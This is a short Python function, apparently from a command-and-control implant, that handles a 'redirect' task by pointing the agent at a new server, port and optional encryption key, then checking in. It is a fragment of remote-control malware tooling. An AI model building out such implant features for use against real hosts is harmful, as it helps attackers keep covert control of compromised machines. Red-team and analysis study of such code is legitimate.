def redirect(task_id, command):

    params = command.replace(":", " ")

    params = params.split(" ")

    print(params)

    if len(params) < 2:
        response = {
            'task_id': task_id,
            "user_output": "usage redirect <host:port> [OPTIONAL] <encryption_key>",
            'completed': True
        }
        responses.append(response)
        return

    else:

        ip = params[0]
        port = params[1]

        if len(params) > 2:
            print(colored("Setting key {}".format(params[2]), "red"))
            agent.set_Encryption_key(params[2])

        
        agent.set_Server("http://" + ip)
        agent.set_Port(port)

        print(colored("Switching to {}:{}".format(agent.get_Server(), agent.get_Port())))

        checkin()

        response = {
                'task_id': task_id,
                "user_output": "Redirected to {}:{}".format(agent.get_Server(), agent.get_Port()),
                'completed': True
            }
        responses.append(response)

        print("\t- Redirect Done")

        return